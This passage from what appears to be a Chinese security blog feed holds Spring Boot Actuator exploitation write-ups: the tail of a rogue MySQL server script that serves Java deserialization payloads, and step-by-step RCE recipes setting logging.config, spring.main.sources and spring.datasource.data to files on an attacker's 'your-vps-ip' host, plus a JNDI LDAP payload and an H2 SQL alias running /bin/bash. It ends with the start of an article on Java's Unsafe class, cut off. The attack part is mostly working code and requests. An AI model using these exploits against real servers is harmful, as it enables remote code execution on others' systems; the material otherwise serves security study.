deserialization_payload = binascii.b2a_hex(_f.read())</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># client auth</span></span><br><span class="line">            server_receive(conn)</span><br><span class="line">            server_send(conn, response_ok)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># client query</span></span><br><span class="line">            data = server_receive(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;session.auto_increment_increment&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload = <span class="string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c210009000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000f90000150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013007343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e035554430653595354454d0f52455045415441424c452d5245414405323838303007000016fe000002000200&#x27;</span></span><br><span class="line">                server_send(conn, _payload)</span><br><span class="line">                data = server_receive(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span></span><br><span class="line">                server_send(conn, _payload)</span><br><span class="line">                data = server_receive(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set names&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                server_send(conn, response_ok)</span><br><span class="line">                data = server_receive(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set character_set_results&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                server_send(conn, response_ok)</span><br><span class="line">                data = server_receive(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show session status&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _data = <span class="string">&#x27;0100000102&#x27;</span></span><br><span class="line">                _data += <span class="string">&#x27;2700000203646566056365736869046f626a73046f626a730269640269640c3f000b000000030000000000&#x27;</span></span><br><span class="line">                _data += <span class="string">&#x27;2900000303646566056365736869046f626a73046f626a73036f626a036f626a0c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                _payload_hex = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(deserialization_payload)/<span class="number">2</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">4</span>)</span><br><span class="line">                _payload_length = _payload_hex[<span class="number">2</span>:<span class="number">4</span>] + _payload_hex[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                _data_hex = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(deserialization_payload)/<span class="number">2</span> + <span class="number">5</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">6</span>)</span><br><span class="line">                _data_lenght = _data_hex[<span class="number">4</span>:<span class="number">6</span>] + _data_hex[<span class="number">2</span>:<span class="number">4</span>] + _data_hex[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                _data += _data_lenght + <span class="string">&#x27;04&#x27;</span> + <span class="string">&#x27;0131fc&#x27;</span> + _payload_length + deserialization_payload</span><br><span class="line">                _data += <span class="string">&#x27;07000005fe000022000100&#x27;</span></span><br><span class="line">                server_send(conn, _data)</span><br><span class="line">                data = server_receive(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span></span><br><span class="line">                server_send(conn, _payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn.close()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    PORT = <span class="number">3306</span></span><br><span class="line"></span><br><span class="line">    deserialization_file = <span class="string">r&#x27;payload.ser&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(deserialization_file):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(deserialization_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            deserialization_payload = binascii.b2a_hex(f.read())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        deserialization_payload = <span class="string">&#x27;aced****(your deserialized hex data)&#x27;</span></span><br><span class="line"></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    BUFFER_SIZE = <span class="number">1024</span></span><br><span class="line">    response_ok = <span class="string">&#x27;0700000200000002000000&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] rogue mysql server Listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(HOST, PORT))</span><br><span class="line">    server_socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server_socks.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    server_socks.bind((HOST, PORT))</span><br><span class="line">    server_socks.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    run_mysql_server()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过 POST 设置属性值<code>spring.datasource.url</code> 为外部恶意 mysql jdbc url 地址，就是上步的vps开启的mysql地址</p><p><img src="https://s2.loli.net/2022/06/26/vkMEBwt5y7o8CaF.png" alt="image-20220626022709041"></p><p>在进行网站查询操作时，会触发数据库查询等操作，会与恶意的 mysql jdbc url 建立数据库连接，恶意 mysql server 就会在建立连接的合适阶段返回序列化的 payload 数据，最后目标会反序列化设置好的 gadget，造成RCE漏洞。</p><p><img src="https://s2.loli.net/2022/06/26/pjCntSF4qoaLW6r.png" alt="image-20220626022652992"></p><p>漏洞原理：</p><ol><li>spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址</li><li>refresh 刷新后设置了一个新的 spring.datasource.url 属性值</li><li>当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接</li><li>然后恶意 mysql server 就会在建立连接的合适阶段返回序列化 payload 数据</li><li>目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞</li></ol><h4 id="restart-logging-config-logback-JNDI-RCE"><a href="#restart-logging-config-logback-JNDI-RCE" class="headerlink" title="restart logging.config logback JNDI RCE"></a>restart logging.config logback JNDI RCE</h4><p>利用条件：</p><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li><li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201&#x2F;7u191&#x2F;8u182&#x2F;11.0.1(LDAP)，但相关环境可绕过</li><li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li><li>⚠️ HTTP 服务器如果返回含有畸形 xml 语法内容的文件，会导致程序异常退出</li><li>⚠️ JNDI 服务返回的 object 需要实现 <code>javax.naming.spi.ObjectFactory</code> 接口，否则会导致程序异常退出</li></ul><p>利用方法：</p><p>步骤一：托管 xml 文件</p><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 使用 python 快速开启 http server</span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>在根目录放置以 <code>xml</code> 结尾的 <code>example.xml</code> 文件，实际内容要根据步骤二中使用的 JNDI 服务来确定：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;insertFromJNDI env-entry-name=&quot;ldap://your-vps-ip:1389/TomcatBypass/Command/Base64/Y2FsYw==&quot; as=&quot;appName&quot; /&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure><p>步骤二：托管恶意 ldap 服务及代码</p><p>参考<a href="https://landgrey.me/blog/21/">文章</a>，修改 <a href="https://github.com/feihong-cs/JNDIExploit">JNDIExploit</a> 并启动（也可以使用其他方法）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.0-SNAPSHOT.jar -i your-vps-ip</span><br></pre></td></tr></table></figure><p>步骤三：设置 logging.config 属性</p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">logging.config=http://your-vps-ip/example.xml</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.xml&quot;&#125;</span><br></pre></td></tr></table></figure><p>步骤四：重启应用</p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><p>测试：</p><p>通过 POST 方式设置 logging.config 的值</p><p><img src="https://s2.loli.net/2022/06/26/d2zMj7IC1tNw8Yg.png" alt="image-20220626022800084"></p><p>请求 &#x2F;restart 接口，触发RCE</p><p><img src="https://s2.loli.net/2022/06/26/3HVaTonKCjwM9zL.png" alt="image-20220626022748766"></p><p>HTTP请求记录</p><p><img src="https://s2.loli.net/2022/06/26/E45jPSztM6Q2gCo.png" alt="image-20220626022820766"></p><p>JNDIExploit请求记录</p><p><img src="https://s2.loli.net/2022/06/26/iItOpsA8y7wCPZr.png" alt="image-20220626022812572"></p><p>漏洞原理：</p><ol><li>目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址</li><li>restart 重启应用后，程序会请求 URL 地址获得恶意 xml 文件内容</li><li>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</li><li>xml 文件中利用 <code>logback</code> 依赖的 <code>insertFormJNDI</code> 标签，设置了外部 JNDI 服务器地址</li><li>目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</li></ol><h4 id="restart-logging-config-groovy-RCE"><a href="#restart-logging-config-groovy-RCE" class="headerlink" title="restart logging.config groovy RCE"></a>restart logging.config groovy RCE</h4><p>利用条件：</p><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li><li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li><li>⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出</li><li>⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出</li></ul><p>利用方法：</p><p>步骤一：托管 groovy 文件</p><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 使用 python 快速开启 http server</span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>在根目录放置以 <code>groovy</code> 结尾的 <code>example.groovy</code> 文件，内容为需要执行的 groovy 代码，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;calc&quot;)</span><br></pre></td></tr></table></figure><p>步骤二：设置 logging.config 属性</p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">logging.config=http://your-vps-ip/example.groovy</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure><p>步骤三：重启应用</p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><p>测试：</p><p>通过 POST 设置 logging.config 的属性值</p><p><img src="https://s2.loli.net/2022/06/26/bVSuoRCOKBF8xPv.png" alt="image-20220626022916922"></p><p>请求 &#x2F;restart 接口，触发RCE</p><p><img src="https://s2.loli.net/2022/06/26/fVctDLHwRvFYozC.png" alt="image-20220626022908260"></p><p>HTTP 请求记录</p><p><img src="https://s2.loli.net/2022/06/26/6zxPD7Y2Zqicbm1.png" alt="image-20220626023421444"></p><p>漏洞原理：</p><ol><li>目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址</li><li>restart 重启应用后，程序会请求设置的 URL 地址</li><li><code>logback-classic</code> 组件的 <code>ch.qos.logback.classic.util.ContextInitializer.java</code> 代码文件逻辑中会判断 url 是否以 <code>groovy</code> 结尾</li><li>如果 url 以 <code>groovy</code> 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞</li></ol><h4 id="restart-spring-main-sources-groovy-RCE"><a href="#restart-spring-main-sources-groovy-RCE" class="headerlink" title="restart spring.main.sources groovy RCE"></a>restart spring.main.sources groovy RCE</h4><p>利用条件：</p><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li><li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li><li>⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出</li><li>⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出</li></ul><p>步骤一：托管 groovy 文件</p><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 使用 python 快速开启 http server</span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>在根目录放置以 <code>groovy</code> 结尾的 <code>example.groovy</code> 文件，内容为需要执行的 groovy 代码，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;open -a Calculator&quot;)</span><br></pre></td></tr></table></figure><p>步骤二：设置 spring.main.sources 属性</p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.main.sources=http://your-vps-ip/example.groovy</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.main.sources&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure><p>步骤三：重启应用</p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><p>测试：</p><p>通过 POST 设置 logging.config 的属性值</p><p><img src="https://s2.loli.net/2022/06/26/WsxrTZ9OaFKXNwt.png" alt="image-20220626023718193"></p><p>请求 &#x2F;restart 接口，触发RCE</p><p><img src="https://s2.loli.net/2022/06/26/xJ29Rk6MKiBoeVZ.png" alt="image-20220626023658597"></p><p>HTTP 请求记录</p><p><img src="https://s2.loli.net/2022/06/26/PVfcAKTlDLMdwqn.png" alt="image-20220626023553751"></p><h4 id="restart-spring-datasource-data-h2-database-RCE"><a href="#restart-spring-datasource-data-h2-database-RCE" class="headerlink" title="restart spring.datasource.data h2 database RCE"></a>restart spring.datasource.data h2 database RCE</h4><p>利用条件：</p><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li><li>环境中需要存在 <code>h2database</code>、<code>spring-boot-starter-data-jpa</code> 相关依赖</li><li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li><li>⚠️ HTTP 服务器如果返回含有畸形 h2 sql 语法内容的文件，会导致程序异常退出</li></ul><p>利用方法：</p><p>步骤一：托管 sql 文件</p><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 使用 python 快速开启 http server</span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>在根目录放置以任意名字的文件，内容为需要执行的 h2 sql 代码，比如：</p><blockquote><p>⚠️ 下面payload 中的 ‘T5’ 方法只能 restart 执行一次；后面 restart 需要更换新的方法名称 (如 T6) 和设置新的 sql URL 地址，然后才能被 restart 重新使用，否则第二次 restart 重启应用时会导致程序异常退出</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,&#x27;open -a Calculator&#x27;);</span><br></pre></td></tr></table></figure><p>步骤二：设置 spring.datasource.data 属性</p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.data=http://your-vps-ip/example.sql</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.data&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.sql&quot;&#125;</span><br></pre></td></tr></table></figure><p>步骤三：重启应用</p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><p>测试：</p><p>通过 POST 设置 spring.datasource.data 属性值</p><p><img src="https://s2.loli.net/2022/06/26/kiajcvJTKyEQuZr.png" alt="image-20220626023828376"></p><p>请求 &#x2F;restart 接口，触发RCE</p><p><img src="https://s2.loli.net/2022/06/26/uRzp6nr8ytAYZBS.png" alt="image-20220626023808324"></p><p>HTTP 请求记录如下</p><p><img src="https://s2.loli.net/2022/06/26/4FTCb53KdzQGPSn.png" alt="image-20220626023841255"></p><p>漏洞原理：</p><ol><li>目标机器可以通过 spring.datasource.data 属性来设置 jdbc DML sql 文件的 URL 地址</li><li>restart 重启应用后，程序会请求设置的 URL 地址</li><li><code>spring-boot-autoconfigure</code> 组件中的 <code>org.springframework.boot.autoconfigure.jdbc.DataSourceInitializer.java</code> 文件代码逻辑中会使用 <code>runScripts</code> 方法执行请求 URL 内容中的 h2 database sql 代码，造成 RCE 漏洞</li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/LandGrey/SpringBootVulExploit">https://github.com/LandGrey/SpringBootVulExploit</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;SpringBoot-相关漏洞的学习&quot;&gt;&lt;a href=&quot;#SpringBoot-相关漏洞的学习&quot; class=&quot;headerlink&quot; title=&quot;SpringBoot 相关漏洞的学习&quot;&gt;&lt;/a&gt;SpringBoot 相关漏洞的学习&lt;/h3&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="SpringBoot" scheme="https://kpa1on.github.io/tags/SpringBoot/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Unsafe类</title>
    <link href="https://kpa1on.github.io/2022/06/20/Java%E5%AE%89%E5%85%A8%E4%B9%8BUnsafe%E7%B1%BB/"/>
    <id>https://kpa1on.github.io/2022/06/20/Java%E5%AE%89%E5%85%A8%E4%B9%8BUnsafe%E7%B1%BB/</id>
    <published>2022-06-20T02:30:36.000Z</published>
    <updated>2022-06-20T15:21:10.475Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Unsafe类是一个位于<code>sun.misc</code>包下的类，它提供了一些相对底层方法，能够让我们接触到一些更接近操作系统底层的资源，如系统的内存资源、cpu指令等。而通过这些方法，我们能够完成一些普通方法无法实现的功能，例如直接使用偏移地址操作对象、数组等等。但是在使用这些方法提供的便利的同时，也存在一些潜在的安全因素，例如对内存的错误操作可能会引起内存泄漏，严重时甚至可能引起<code>jvm</code>崩溃。因此在使用<code>Unsafe</code>前，我们必须要了解它的工作原理与各方法的应用场景，并且在此基础上仍需要非常谨慎的操作，下面我们正式开始对<code>Unsafe</code>的学习。</p><span id="more"></span><h3 id="Unsafe功能"><a href="#Unsafe功能" class="headerlink" title="Unsafe功能"></a>Unsafe功能</h3><p>Unsafe的功能大致如下：</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220620103647091-1158751055.png" alt="image-20220620103646466"></p><p>查看<code>Unsfe</code>源码，可以看到该类被<code>final</code>关键字修饰，代表不能被其他类继承</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220620103913629-1940021883.png" alt="image-20220620103913441"></p><p>构造方法被<code>private</code>修饰，就表明不能通过<code>new</code>的方式创建<code>Unsafe</code>类的实例，下面的<code>getUnsafe()</code>方法可以返回Unsafe的实例。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220620104204571-232105421.png" alt="image-20220620104204449"></p><p>查看下<code>isSystemDomainLoader()</code>方法，可以看到如果<code>var0</code>为<code>Bootstrap</code>类加载器，那么就会等于”null”，也就是返回true</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220620104837713-1091388885.png" alt="image-20220620104837746"></p><p>编写测试方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220620105153809-876885794.png" alt="image-20220620105153647"></p><h3 id="Unsafe调用"><a href="#Unsafe调用" class="headerlink" title="Unsafe调用"></a>Unsafe调用</h3><h4 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h4><p>该类的成员变量<code>theUnsafe</code>定义为它的实例化，因此可以利用反射获取该变量的值</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220620105932113-277751152.png" alt="image-20220620105932116"></p><p>编写测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, 